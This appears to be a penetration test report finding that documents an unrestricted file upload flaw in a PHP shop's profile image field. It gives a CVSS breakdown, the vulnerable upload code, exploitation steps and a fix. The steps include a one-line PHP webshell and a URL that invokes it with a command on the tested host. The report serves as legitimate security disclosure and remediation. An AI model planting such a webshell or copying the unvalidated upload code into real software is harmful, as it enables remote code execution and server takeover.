# Finding 7: Unrestricted File Upload

[← Back to Finding Summary](./05-finding-summary.md) | [← Back to README](./README.md)

---

**CVSS Score: 6.5 (Medium)**  
**Category (OWASP):** Insecure Design  
**Affected Endpoint:** `customer/edit_account.php` — Profile Image field

---

## Risk

An attacker can upload malicious files (e.g., malware or PHP webshells) and potentially execute them on the server. This opens the door for **Remote Code Execution (RCE)**, which could allow the attacker to run OS commands, read sensitive system files, or fully take over the server.

> **Note:** Although file upload was successful during testing, the attacker was unable to execute the uploaded file due to a security layer at the server/network level. Further attempts would have also violated the Rules of Engagement. However, this does not eliminate the risk of RCE via other methods.

---

## Severity

Classified as **Medium** because it potentially provides a path to remote code execution and full system control.

---

## CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Upload performed through the web application. |
| Attack Complexity | Low | No file validation exists — exploitation is straightforward. |
| Privileges Required | None | Requires a user account, but accounts can be freely self-registered. |
| User Interaction | None | No additional interaction needed after upload. |
| Scope | Changed | Exploitation could potentially extend from the application to the server OS. |
| Confidentiality Impact | None | Does not directly expose the system — requires further RCE exploitation. |
| Integrity Impact | Low | Does not directly affect integrity without further exploitation. |
| Availability Impact | Low | Does not directly affect availability without further exploitation. |

---

## Source Code Evidence (`customer/edit_account.php`)

Only a check for whether a file was uploaded exists — no validation of file type or extension is performed:

```php
// ❌ Vulnerable — no type validation
if (isset($_FILES['c_image']) && $_FILES['c_image']['error'] == 0) {
    // file is accepted regardless of type
    move_uploaded_file($_FILES['c_image']['tmp_name'], $target_path);
}
```

---

## Exploitation Steps

1. Log in as a customer, navigate to **Edit Account**.
2. In the **Profile Image** field, select `sample_setup.exe` — the file uploads successfully without any error.
   
    <img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/14b1286c-6fde-4f07-89b5-31d47bb083c8" />
    
    <img width="600" height="378" alt="image" src="https://github.com/user-attachments/assets/18e1dc5e-0aea-4875-8f8a-3cc355ecde2e" />

4. To test a webshell, create a file `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```

5. Upload `shell.php`, then attempt to access:
   ```
   http://dibishop.duckdns.org/customer/customer_images/shell.php?cmd=id
   ```
6. Execution via forced browsing was blocked by a network-level security layer.
    <img width="650" height="140" alt="image" src="https://github.com/user-attachments/assets/d5f3a4db-d9a0-4741-a2d3-096543b1a8db" />

---

## Attack Chain

With a malicious file present on the server, further RCE attempts via alternative methods (e.g., local file inclusion, other execution vectors) cannot be ruled out — even if direct forced browsing was blocked.

---

## Impact

- Potential **Remote Code Execution** — attacker could run OS commands on the server.
- Potential **full server takeover** — reading system files, creating backdoors, pivoting to internal network.
- Presence of malicious files on the server even without immediate execution poses an ongoing risk.

---

## Mitigation

Validate file extension — only allow safe image types:

```php
// ✅ Fixed
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['c_image']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die('File type not allowed');
}
```

Additionally:
- **Rename uploaded files** to a randomly generated name so they cannot be predicted or directly accessed.
- Validate file **MIME type** in addition to extension.
- Store uploaded files **outside the web root** when possible, serving them via a controlled script.
